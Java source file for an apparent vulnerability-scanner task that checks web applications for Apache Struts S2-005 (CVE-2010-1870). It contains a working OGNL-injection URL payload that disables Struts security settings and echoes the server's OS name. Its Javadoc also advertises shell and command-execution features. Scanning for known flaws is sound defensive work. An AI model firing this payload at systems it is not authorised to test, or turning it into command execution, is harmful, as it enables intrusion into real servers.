package com.shaobing.wallaby.core.jscan.apache;

import com.shaobing.wallaby.common.http.httpclient.HttpUtils;
import com.shaobing.wallaby.common.logger.LoggerUtils;
import com.shaobing.wallaby.core.jscan.common.PreambleInfo;
import com.shaobing.wallaby.core.jscan.common.ScanIssue;
import com.shaobing.wallaby.core.jscan.common.Severity;
import com.shaobing.wallaby.core.jscan.common.exception.ScanTaskRuntimeException;
import com.shaobing.wallaby.core.jscan.common.task.ScanTask;
import com.shaobing.wallaby.core.jscan.common.task.ScanTaskCallback;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * 检测Apache S2-005
 * <p>
 * <b>S2-005  CVE-2010-1870</b>
 * 支持GetShell/获取物理路径/执行CMD命令/列文件目录
 * <a href="http://blog.o0o.nu/2010/07/cve-2010-1870-struts2xwork-remote.html"></a>
 * </p>
 *
 * @author luyb@servyou.com.cn
 * @version $$: ApacheS2005ScanTask.java v 0.1 2016/12/1 1:25 luyb Exp $$
 */
public class ApacheS2005ScanTask implements ScanTask {

    private static final Logger  LOGGER          = LoggerFactory
        .getLogger(ApacheS2005ScanTask.class);

    /** 判定操作系统名称 */
    private static final Pattern OS_NAME_PATTERN = Pattern.compile("(windows)|(linux)",
        Pattern.CASE_INSENSITIVE);

    /** CVE_2010_1870 */
    public static final String   CVE_2010_1870   = "CVE-2010-1870";

    /** 漏洞说明 */
    public static final String   DESCRIPTION     = "http://struts.apache.org/docs/s2-005.html";

    /** 解决方案 */
    public static final String   SOLUTION        = "Developers should immediately upgrade to Struts 2.2.1 or read the following solution instructions carefully for a configuration change to mitigate the vulnerability";

    /**
     * @see com.shaobing.wallaby.core.jscan.common.task.ScanTask#execute(String, PreambleInfo, ScanTaskCallback)
     */
    @Override
    public List<ScanIssue> execute(String url, PreambleInfo preambleInfo,
                                   ScanTaskCallback scanTaskCallback) throws ScanTaskRuntimeException {
        try {
            String key = "os.name";
            String payloadUrl = url + "?"
                                + "('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('\\43xman.getWriter().println(@java.lang.System@getProperty(%22"
                                + key + "%22))')(d))&(i99)(('\\43xman.getWriter().close()')(d))";
            String body = HttpUtils.get(payloadUrl);
            LoggerUtils.info(LOGGER, "请求结果为{0}", body);

            List<ScanIssue> scanIssues = new ArrayList<>();
            Matcher matcher = OS_NAME_PATTERN.matcher(body);
            if (matcher.find()) {
                ScanIssue scanIssue = new ScanIssue();
                scanIssue.setCve(CVE_2010_1870);
                scanIssue.setDescription(DESCRIPTION);
                scanIssue.setSeverity(Severity.HIGH);
                scanIssue.setSolution(SOLUTION);
                scanIssue.setUrl(url);
                scanIssue.setExtInfos(preambleInfo.convertToMap());
                scanIssues.add(scanIssue);
            }

            if (scanTaskCallback != null)
                scanTaskCallback.callback();

            return scanIssues;

        } catch (Throwable e) {
            LoggerUtils.error(LOGGER, e.getMessage());
            throw new ScanTaskRuntimeException("扫描 Apache S2-005 发生错误," + e.getMessage());
        } finally {
        }
    }

}
